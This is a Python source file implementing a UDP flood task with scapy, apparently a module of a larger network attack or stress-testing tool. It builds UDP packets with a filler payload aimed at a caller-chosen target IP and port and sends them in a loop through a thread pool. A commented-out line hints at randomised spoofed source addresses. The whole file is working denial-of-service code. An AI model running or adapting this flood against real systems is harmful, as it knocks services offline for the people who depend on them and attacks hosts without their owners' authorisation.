from lib.Task import Task
from scapy.all import *
from lib.ThreadPool import ThreadPool
import math
conf.verb = 0
class UdpFlood(Task):
    def __init__(self, id,progress_callback):
        super(UdpFlood,self).__init__(id,progress_callback)
    def doTask(self,**kwargs):
        no_of_packets = kwargs.get('no_of_packets', None)
        target_ip = kwargs.get('target_ip', None)
        dport = kwargs.get('dport', None)
        sport = kwargs.get('sport', None)
        # s_addr = RandIP()
        no_of_loops = math.ceil(no_of_packets+1)
        payload = 'a' * 100
        for i in range(no_of_loops):
            self.progress += 101/no_of_loops
            try:
                print(dport)
                pkt = (IP(dst=target_ip)/UDP(sport=sport,dport=dport)/payload)
                ThreadPool.executor.submit(send(pkt))
            except Exception as e:
                print(e)
            finally:                
                self.progressUpdateCallBack()
        self.progress = 100 # Complete
        #! Avoid .999999993121312321
        self.progressUpdateCallBack()
# x = UdpFlood("213")
# x.runTask()
